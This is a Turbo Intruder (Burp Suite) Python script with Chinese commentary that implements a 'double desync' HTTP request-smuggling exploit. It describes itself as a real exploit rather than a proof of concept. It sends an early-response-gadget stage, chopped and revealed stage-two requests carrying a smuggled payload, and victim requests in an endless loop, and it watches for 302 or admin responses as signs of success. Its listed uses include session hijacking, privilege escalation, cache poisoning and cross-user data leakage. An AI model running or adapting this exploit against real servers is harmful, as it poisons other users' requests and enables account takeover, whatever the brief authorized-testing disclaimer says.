"""
0-Click漏洞利用脚本 - Turbo Intruder

功能说明：
这是一个用于实际利用0-Click漏洞的高级脚本。
相比概念验证脚本，此脚本实现了更复杂的双重去同步攻击，可以实现真正的漏洞利用。

攻击原理：
1. 第一阶段：发送包含早期响应小工具的请求
2. 第二阶段：发送截断的请求和走私载荷
3. 受害者阶段：毒化其他用户的请求
4. 双重去同步：利用两次协议解析差异

技术特点：
- 使用双重去同步技术
- 支持复杂的载荷注入
- 可自定义攻击载荷
- 自动化攻击流程
- 支持多种HTTP方法

攻击阶段：
1. Stage1: 早期响应小工具 + Content-Length操控
2. Stage2: 截断请求 + 揭示请求 + 走私载荷
3. Victim: 受害者请求（被毒化）

使用场景：
- 高级HTTP请求走私攻击
- 0-Click漏洞实际利用
- 会话劫持和权限提升
- Web缓存毒化攻击
- 跨用户数据泄露

参数配置：
- concurrentConnections: 10（高并发）
- requestsPerConnection: 1（单请求连接）
- engine: Engine.BURP（Burp网络栈）
- timeout: 15秒（较长超时）

载荷配置：
- smuggled: 要注入的恶意载荷
- stage2_chopped: 截断的第二阶段请求
- stage2_revealed: 揭示的第二阶段请求
- victim: 受害者请求模板

重要提醒：
- 0-Click攻击使用双重去同步，可能需要较长时间
- 攻击成功率取决于目标服务器配置
- 需要精确的时序控制
- 可能影响其他用户

安全注意：
- 仅用于授权的安全测试
- 在隔离环境中进行测试
- 遵守负责任的漏洞披露
- 注意攻击的持续时间

参考资料：
https://portswigger.net/research/http1-must-die

使用方法：
1. 修改host变量为目标域名
2. 自定义smuggled载荷
3. 调整各阶段的请求模板
4. 运行脚本并监控结果
"""

def queueRequests(target, wordlists):
    # 创建0-Click利用引擎
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,        # 高并发攻击
                           requestsPerConnection=1,          # 单请求连接
                           engine=Engine.BURP,               # Burp网络栈
                           maxRetriesPerRequest=0,           # 不重试
                           timeout=15                        # 15秒超时
                           )

    # 第一阶段：应包含早期响应小工具和Content-Length头部（值设为%s）
    stage1 = '''POST /nul HTTP/1.1
Host: '''+host+'''
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length : %s

'''

    # 这将被添加到受害者请求的前缀 - 在此处放置您的载荷
    smuggled = '''GET /resources HTTP/1.1
X: Y'''



    # 如果服务器不喜欢带有请求体的GET，可以尝试OPTIONS等方法
    stage2_chopped = '''GET / HTTP/1.1
Content-Length: 123
X: Y'''

    # 第二阶段揭示请求
    stage2_revealed = '''GET /404 HTTP/1.1
Host: '''+host+'''
User-Agent: foo
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

'''

    # 受害者请求模板
    victim = '''GET / HTTP/1.1
Host: '''+host+'''
User-Agent: foo

'''

    # 以下代码无需编辑
    if '%s' not in stage1:
        raise Exception('请在Content-Length头部值中放置%s占位符')

    if not stage1.endswith('\r\n\r\n'):
        raise Exception('Stage1请求必须以空行结尾且不包含请求体')


    # 执行三阶段0-Click攻击
    while True:
        # 第一阶段：早期响应小工具
        engine.queue(stage1, len(stage2_chopped), label='stage1', fixContentLength=False)
        # 第二阶段：截断 + 揭示 + 走私
        engine.queue(stage2_chopped + stage2_revealed + smuggled, label='stage2')
        # 受害者阶段：被毒化的请求
        engine.queue(victim, label='victim')


def handleResponse(req, interesting):
    # 记录所有响应用于0-Click攻击分析
    table.add(req)

    # 0-Click攻击使用双重去同步，可能需要较长时间！
    # 如果希望攻击成功时自动停止，可以取消注释并自定义以下代码
    if req.label == 'victim' and req.status == 302:
        print(f"检测到受害者请求被重定向（302），可能的攻击成功！")
        req.engine.cancel()  # 停止攻击引擎

    # 其他可能的成功指标：
    # elif req.label == 'victim' and req.status == 404:
    #     print(f"受害者请求返回404，走私载荷可能生效")
    #     req.engine.cancel()

    # elif req.label == 'victim' and 'admin' in req.response:
    #     print(f"在受害者响应中发现管理员内容，权限提升成功")
    #     req.engine.cancel()

    # 可以根据具体攻击目标添加更多检测条件：
    # - 特定的响应内容
    # - 异常的响应头部
    # - 会话令牌变化
    # - 权限相关的响应

